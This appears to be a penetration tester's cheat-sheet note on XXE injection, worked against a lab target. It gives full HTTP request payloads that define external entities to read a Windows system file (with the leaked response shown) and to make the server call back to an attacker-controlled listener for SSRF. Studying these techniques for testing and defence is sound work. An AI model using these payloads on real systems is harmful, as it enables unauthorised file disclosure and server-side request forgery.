# XXE Injection
https://portswigger.net/web-security/xxe

https://whitehats.pwr.edu.pl/research/xxe-injection/

https://book.hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html

https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xxe.md

## Examples
Legit POST request:
```
POST /process.php HTTP/1.1
Host: 10.129.95.192
[...]
Connection: keep-alive

<?xml version = "1.0"?>
<order><quantity>1</quantity><item>Home Appliances</item><address>adsadasads</address></order>
```
### LFI
Test LFI (IF we se the output on the HTTP Response)
HTTP Request
```
POST /process.php HTTP/1.1
Host: 10.129.95.192
[...]
Connection: keep-alive

<?xml version = "1.0"?>
<!DOCTYPE xxe [
    <!ENTITY lfi SYSTEM "file:///c:/windows/win.ini">
]>
<order><quantity>1</quantity><item>&lfi;</item><address>aaaa</address></order>
```
HTTP Response
```
Your order for ; for 16-bit app support
[fonts]
[...]
COM1:=9600,n,8,1
 has been processed
```

### SSRF
Test SSFR to confirm vulnerability
1. Run Python web server on Kali
```
python -m http.server 8081
```
2. Try to perform SSRF
```
POST /process.php HTTP/1.1
Host: 10.129.95.192
[...]
Connection: keep-alive

<?xml version = "1.0"?>
<!DOCTYPE xxe [
    <!ENTITY ssrf SYSTEM "http://<KALI IP>:8081">
]>
<order><quantity>1</quantity><item>Home Appliances</item><address>&ssrf;</address></order>
```
3. We see connection to Python webserver confirming the vuln!

### LFI via SSRF
Great when we want to see file (LFI) but web server does not return our data in HTTP response
https://whitehats.pwr.edu.pl/research/xxe-injection/#ssrf-and-lfi-via-xxe-injection
